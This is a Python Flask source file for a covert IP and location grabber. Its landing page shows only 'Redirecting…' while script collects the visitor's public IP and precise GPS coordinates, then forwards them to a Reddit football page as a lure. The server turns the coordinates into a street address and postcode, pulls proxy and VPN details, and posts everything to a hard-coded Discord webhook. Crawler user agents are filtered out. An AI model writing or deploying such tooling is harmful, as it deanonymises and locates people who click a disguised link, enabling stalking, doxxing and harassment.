"""
main.py - Visitor logger with precise browser geolocation + accurate proxy IP/port extraction.

Features:
 - Browser gets public IP (api.ipify) and (optionally) device GPS coords (navigator.geolocation).
 - Server reverse-geocodes GPS to an address (Nominatim) and captures postal code.
 - Falls back to ipapi.co / ipwho.is if no GPS.
 - Extracts proxy chain, proxy IP, and proxy port as accurately as possible.
 - Sends Discord embed (masked map link + clickable title).
 - Debug logging to file 'visitor_debug.log'.
 - BLOCK_VPN toggle (default False).
"""

from flask import Flask, request, redirect, jsonify, abort
import requests
from datetime import datetime
import threading
import time
import socket
import os
import re
import traceback
import urllib.parse

app = Flask(__name__)

# ========== CONFIG ==========
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1430264733193207848/5fOooaQ3VYQePvd7m0ZR6hZsYPW0ML6pk9jZ5wMcin7JkyuHHVg_IQicnDqr18NWvsQh"
REDIRECT_URL = "https://www.reddit.com/r/footballhighlights/"
DEBUG_LOG_PATH = os.getenv("VISITOR_DEBUG_LOG", "visitor_debug.log")

# Toggle blocking of VPN/proxy-detected IPs (heuristic)
BLOCK_VPN = False

# UA bot keywords (quick filter)
BOT_UA_KEYWORDS = [
    "googlebot","bingbot","slurp","duckduckbot","baiduspider",
    "yandexbot","sogou","exabot","facebot","facebookexternalhit",
    "ia_archiver","python-requests","go-http-client","curl","wget"
]

# VPN/datacenter heuristics (logged, not blocking by default)
CLOUD_ORG_KEYWORDS = [
    "amazon","aws","google cloud","google","microsoft","azure",
    "digitalocean","hetzner","linode","ovh","oracle","cloudflare",
    "rackspace","vultr","scaleway","kimsufi","contabo"
]
VPN_KEYWORDS_EXPANDED = [
    "vpn","proxy","private internet access","pia","nordvpn","protonvpn",
    "mullvad","surfshark","expressvpn","windscribe","hide.me","hidemyass",
    "torguard","vpnbook","purevpn","ipvanish","vyprvpn","hotspotshield",
    "privatevpn","vpn.ht","cyberghost","zenmate","tunnelbear","psiphon","proton"
]

# ========== HELPERS ==========
def now_gmt():
    return datetime.utcnow().strftime("%d/%m/%Y %H:%M:%S GMT")

def log_debug(line: str):
    ts = now_gmt()
    s = f"{ts} | {line}"
    try:
        print(s)
        with open(DEBUG_LOG_PATH, "a", encoding="utf-8") as f:
            f.write(s + "\n")
    except Exception:
        # don't crash on logging failure
        print("LOG FAIL:", traceback.format_exc())

def is_bot_ua(ua: str) -> bool:
    if not ua:
        return False
    ua_l = ua.lower()
    return any(k in ua_l for k in BOT_UA_KEYWORDS)

# ========== GEO & IP LOOKUP ==========
def reverse_geocode_nominatim(lat: float, lon: float) -> dict:
    """
    Reverse geocode with Nominatim (OpenStreetMap). Returns dict with 'display_name' and 'address' keys.
    Usage policy: include a descriptive User-Agent.
    """
    url = "https://nominatim.openstreetmap.org/reverse"
    headers = {"User-Agent": "VisitorLogger/1.0 (contact: you@example.com)"}
    params = {"format": "jsonv2", "lat": str(lat), "lon": str(lon), "addressdetails": 1}
    try:
        r = requests.get(url, params=params, headers=headers, timeout=8)
        if r.status_code == 200:
            return r.json()
        else:
            log_debug(f"Nominatim non-200: {r.status_code} for {lat},{lon}")
    except Exception as e:
        log_debug(f"Nominatim error for {lat},{lon}: {e}")
    return {}

def fetch_ipapi(ip: str) -> dict:
    try:
        headers = {"User-Agent": "VisitorLogger/1.0"}
        r = requests.get(f"https://ipapi.co/{ip}/json/", headers=headers, timeout=6)
        if r.status_code == 200:
            return r.json() or {}
        else:
            log_debug(f"ipapi non-200 {r.status_code} for {ip}")
    except Exception as e:
        log_debug(f"ipapi error for {ip}: {e}")
    return {}

def fetch_ipwho_is(ip: str) -> dict:
    try:
        r = requests.get(f"https://ipwho.is/{ip}", timeout=6)
        if r.status_code == 200:
            data = r.json() or {}
            if data.get("success", True) is not False:
                return data
            else:
                log_debug(f"ipwho.is fail success=false for {ip}")
        else:
            log_debug(f"ipwho.is non-200 {r.status_code} for {ip}")
    except Exception as e:
        log_debug(f"ipwho.is error for {ip}: {e}")
    return {}

def enrich_ip(ip: str) -> dict:
    details = fetch_ipapi(ip)
    source = "ipapi"
    if not details or (not details.get("city") and not details.get("org") and not details.get("latitude")):
        fb = fetch_ipwho_is(ip)
        if fb:
            details = {
                "city": fb.get("city"),
                "region": fb.get("region"),
                "country_name": fb.get("country"),
                "postal": fb.get("postal") or fb.get("postal_code"),
                "org": fb.get("org") or fb.get("isp") or fb.get("connection", {}).get("asn_org"),
                "latitude": fb.get("latitude") or fb.get("lat"),
                "longitude": fb.get("longitude") or fb.get("lon"),
                "raw_fallback": fb
            }
            source = "ipwho.is"
    # normalize
    try:
        lat = details.get("latitude") or details.get("lat") or 0
        lon = details.get("longitude") or details.get("lon") or 0
        details["latitude"] = float(lat) if lat not in (None, "", 0) else 0
        details["longitude"] = float(lon) if lon not in (None, "", 0) else 0
    except Exception:
        details["latitude"] = 0
        details["longitude"] = 0
    details.setdefault("city", None)
    details.setdefault("region", None)
    details.setdefault("country_name", None)
    details.setdefault("postal", None)
    details.setdefault("org", None)
    details.setdefault("security", {})
    details["_source"] = source
    return details

# ========== VPN/PROXY HEURISTICS (LOG-ONLY) ==========
def reverse_dns_ptr(ip: str, timeout_sec: float = 0.45) -> str:
    try:
        orig = socket.getdefaulttimeout()
        socket.setdefaulttimeout(timeout_sec)
        try:
            host = socket.gethostbyaddr(ip)[0]
        finally:
            socket.setdefaulttimeout(orig)
        return host
    except Exception:
        return ""

def detect_vpn_or_proxy(details: dict, ip: str = None) -> bool:
    # ipapi security flags
    sec = details.get("security") or {}
    if isinstance(sec, dict) and (sec.get("vpn") or sec.get("proxy") or sec.get("hosting")):
        log_debug(f"vpn_flag via ipapi.security for {ip}, org={details.get('org')}")
        return True
    # ipwho.is threat/type
    raw = details.get("raw_fallback") or {}
    if isinstance(raw, dict):
        if raw.get("threat"):
            log_debug(f"vpn_flag via ipwho.is threat for {ip}")
            return True
        typ = raw.get("type") or raw.get("connection", {}).get("type")
        if typ and str(typ).lower() in ("hosting", "vpn", "proxy"):
            log_debug(f"vpn_flag via ipwho.is type={typ} for {ip}")
            return True
    # org name checks
    org = (details.get("org") or "") or ""
    org_l = org.lower()
    for kw in VPN_KEYWORDS_EXPANDED + CLOUD_ORG_KEYWORDS:
        if kw in org_l:
            log_debug(f"vpn_flag via org keyword '{kw}' for {ip}, org={org}")
            return True
    # PTR check
    if ip:
        ptr = reverse_dns_ptr(ip, timeout_sec=0.45)
        if ptr:
            ptr_l = ptr.lower()
            ptr_indicators = ["vpn","proxy","exit","node","tor","nat","pool","static","client","dialup","dynamic"]
            if any(ind in ptr_l for ind in ptr_indicators):
                log_debug(f"vpn_flag via PTR '{ptr}' for {ip}")
                return True
    return False

# ========== PROXY / PORT EXTRACTION ==========
def parse_forwarded_header(forwarded_val: str):
    if not forwarded_val:
        return []
    entries = []
    parts = forwarded_val.split(",")
    for part in parts:
        record = {}
        for kv in part.split(";"):
            if "=" in kv:
                k, v = kv.split("=", 1)
                record[k.strip().lower()] = v.strip().strip('"').strip()
        if record:
            entries.append(record)
    return entries

def extract_proxy_info():
    """
    Returns:
      proxy_chain: string representation of X-Forwarded-For or Forwarded entries
      proxy_ip: the IP of the immediate proxy that connected to your server (best-effort)
      proxy_port: parsed port if available (string), otherwise REMOTE_PORT
      proxy_source: which header was used
    """
    # full chain from X-Forwarded-For (if present)
    xff = request.headers.get("X-Forwarded-For", "")
    proxy_chain = xff or ""
    if xff:
        parts = [p.strip() for p in xff.split(",") if p.strip()]
        # If there's at least one hop, the last hop is the proxy that connected to us
        if parts:
            last = parts[-1]
            # try parse ip:port (common when proxies append port)
            m = re.match(r'^\[?([0-9a-fA-F\.:]+)\]?(?::(\d+))?$', last)
            if m:
                ip_part = m.group(1)
                port_part = m.group(2) or request.environ.get("REMOTE_PORT")
                return proxy_chain, ip_part, str(port_part or ""), "X-Forwarded-For:last"
            else:
                return proxy_chain, last, str(request.environ.get("REMOTE_PORT") or ""), "X-Forwarded-For:last"

    # Forwarded header parsing
    fwd = request.headers.get("Forwarded", "")
    if fwd:
        parsed = parse_forwarded_header(fwd)
        if parsed:
            # take last entry (closest to us)
            last = parsed[-1]
            candidate = last.get("by") or last.get("for")
            if candidate:
                candidate = candidate.strip()
                m = re.match(r'^\[?([0-9a-fA-F\.:]+)\]?(?::(\d+))?$', candidate)
                if m:
                    ip_part = m.group(1)
                    port_part = m.group(2) or request.environ.get("REMOTE_PORT")
                    return fwd, ip_part, str(port_part or ""), "Forwarded:by/for"
                else:
                    return fwd, candidate, str(request.environ.get("REMOTE_PORT") or ""), "Forwarded:raw"

    # Cloudflare or other header fallbacks
    cf = request.headers.get("CF-Connecting-IP")
    if cf:
        return cf, cf, str(request.environ.get("REMOTE_PORT") or ""), "CF-Connecting-IP"

    tci = request.headers.get("True-Client-IP")
    if tci:
        return tci, tci, str(request.environ.get("REMOTE_PORT") or ""), "True-Client-IP"

    # fallback: remote_addr and REMOTE_PORT
    remote_addr = request.remote_addr
    remote_port = str(request.environ.get("REMOTE_PORT") or "")
    return proxy_chain, remote_addr, remote_port, "remote_addr"

# ========== DISCORD EMBED ==========
def build_map_url(lat: float, lon: float, details: dict):
    if lat and lon:
        return f"https://www.google.com/maps?q={lat},{lon}"
    parts = [p for p in [details.get("city"), details.get("region"), details.get("country_name")] if p]
    if parts:
        q = "+".join("".join(str(x).split()) for x in parts)
        return f"https://www.google.com/maps/search/{q}"
    return "https://www.google.com/maps"

def send_discord_embed(payload: dict) -> bool:
    color_red = 15158332
    try:
        r = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=8)
        log_debug(f"Discord webhook status: {r.status_code} {r.text[:400]}")
        return 200 <= r.status_code < 300
    except Exception as e:
        log_debug(f"Discord webhook exception: {e}")
        return False

# ========== ROUTES ===========
@app.route('/')
def root():
    # Serve a small page that fetches public IP + browser geolocation and posts to /log
    # This requires user consent for GPS coordinates (browser prompt).
    html = f"""
    <!doctype html>
    <html>
      <head><meta charset="utf-8"><title>Redirecting…</title></head>
      <body>
        <script>
          async function sendVisit() {{
            let ip = null;
            try {{
              const r = await fetch('https://api.ipify.org?format=json');
              const j = await r.json();
              ip = j.ip;
            }} catch(e){{ ip = null; }}

            const ua = navigator.userAgent || 'Unknown';

            // Try to get precise GPS coordinates (user must allow)
            if (navigator.geolocation) {{
              navigator.geolocation.getCurrentPosition(function(pos) {{
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                try {{
                  fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ ip: ip, ua: ua, lat: lat, lon: lon }})
                  }});
                }} catch(e){{}}
                window.location.replace('{REDIRECT_URL}');
              }}, function(err) {{
                // User denied or error — send without coords
                try {{
                  fetch('/log', {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{ ip: ip, ua: ua }})
                  }});
                }} catch(e){{}}
                window.location.replace('{REDIRECT_URL}');
              }}, {{ enableHighAccuracy: true, timeout: 10000 }});
            }} else {{
              // No geolocation API
              try {{
                fetch('/log', {{
                  method: 'POST',
                  headers: {{ 'Content-Type': 'application/json' }},
                  body: JSON.stringify({{ ip: ip, ua: ua }})
                }});
              }} catch(e){{}}
              window.location.replace('{REDIRECT_URL}');
            }}
          }}
          sendVisit();
        </script>
        <p>Redirecting…</p>
      </body>
    </html>
    """
    return html

@app.route('/log', methods=['POST'])
def log():
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"error": "bad request"}), 400

    real_ip = data.get("ip") or request.remote_addr
    ua = data.get("ua") or request.headers.get("User-Agent", "Unknown")
    lat = data.get("lat")
    lon = data.get("lon")

    if not real_ip:
        return jsonify({"error": "no ip"}), 400

    # bot UA quick block
    if is_bot_ua(ua):
        log_debug(f"blocked bot UA: {ua}")
        abort(404)

    # get proxy info (chain, immediate ip, port)
    proxy_chain, proxy_ip, proxy_port, proxy_source = extract_proxy_info()
    log_debug(f"visit: real_ip={real_ip}, proxy_ip={proxy_ip}, proxy_port={proxy_port}, proxy_source={proxy_source}, gps_provided={'yes' if lat and lon else 'no'}, ua={ua}")

    # enrich visitor location
    gps_used = False
    address_display = None
    postal = None
    if lat and lon:
        try:
            gps_used = True
            nom = reverse_geocode_nominatim(float(lat), float(lon))
            address_display = nom.get("display_name")
            addr = nom.get("address", {}) if isinstance(nom, dict) else {}
            postal = addr.get("postcode") or addr.get("postal_code") or None
        except Exception as e:
            log_debug(f"Nominatim parse error: {e}")
            gps_used = False

    # fallback: enrich by IP if no GPS
    if not gps_used:
        details = enrich_ip(real_ip)
    else:
        # still call ip enrichment for org/country etc (but prefer gps for address)
        details = enrich_ip(real_ip)

    # VPN/proxy heuristics (log-only unless BLOCK_VPN True)
    vpn_flag = detect_vpn_or_proxy(details, ip=real_ip)
    proxy_vpn_flag = False
    if proxy_ip and proxy_ip != real_ip:
        proxy_details = enrich_ip(proxy_ip)
        proxy_vpn_flag = detect_vpn_or_proxy(proxy_details, ip=proxy_ip)
    effective_vpn = vpn_flag or proxy_vpn_flag
    log_debug(f"vpn heuristics: real_vpn={vpn_flag}, proxy_vpn={proxy_vpn_flag}, effective={effective_vpn}")

    if BLOCK_VPN and effective_vpn:
        log_debug(f"blocked {real_ip} due to VPN heuristics (BLOCK_VPN=True)")
        abort(404)

    # Build map url (prefer GPS coords if present)
    map_url = ""
    if gps_used and lat and lon:
        map_url = build_map_url(float(lat), float(lon), details)
    else:
        map_url = build_map_url(details.get("latitude", 0), details.get("longitude", 0), details)

    # Build Discord payload
    title = f"🚨 New Visitor — {details.get('city') or 'Unknown'}"
    description = f"**Real IP:** `{real_ip}`"
    embed = {
        "username": "🚨 Visitor Alert",
        "embeds": [{
            "title": title,
            "url": map_url,
            "description": description,
            "color": 15158332,
            "fields": [
                {"name": "🖥️ Real IP (from browser)", "value": f"`{real_ip}`", "inline": True},
                {"name": "🔁 Proxy / Connecting IP", "value": f"`{proxy_ip}`", "inline": True},
                {"name": "🔌 Proxy Port", "value": f"{proxy_port or 'Unknown'}", "inline": True},
                {"name": "🔗 Proxy Chain", "value": f"```{proxy_chain or 'none'}```", "inline": False},
                {"name": "📍 Location (city/region/country)", "value": f"{details.get('city') or 'Unknown'}, {details.get('region') or 'Unknown'} ({details.get('country_name') or details.get('country') or 'Unknown'})", "inline": False},
                {"name": "📫 Postal / Postcode", "value": f"{postal or details.get('postal') or 'Unknown'}", "inline": True},
                {"name": "🏢 ISP / Org", "value": f"{details.get('org') or 'Unknown ISP'}", "inline": True},
                {"name": "📍 Precise Address (if allowed)", "value": f"{address_display or 'Not provided'}", "inline": False},
                {"name": "🌍 Map", "value": f"[Open Map]({map_url})", "inline": False},
                {"name": "📱 User Agent", "value": f"`{ua}`", "inline": False},
                {"name": "Source", "value": details.get("_source") or "ipapi", "inline": True},
                {"name": "Time (UTC)", "value": now_gmt(), "inline": True},
                {"name": "GPS Provided", "value": "Yes ✅" if gps_used else "No — used IP lookup", "inline": True}
            ]
        }]
    }

    # Send webhook and log result
    ok = send_discord_embed(embed)
    if not ok:
        log_debug(f"Failed to send webhook for {real_ip}")

    return jsonify({"status": "ok", "sent": ok}), 200

# ========== RUN ===========
if __name__ == "__main__":
    # quick dev run; in production use gunicorn main:app
    app.run(host="0.0.0.0", port=10000, debug=False)
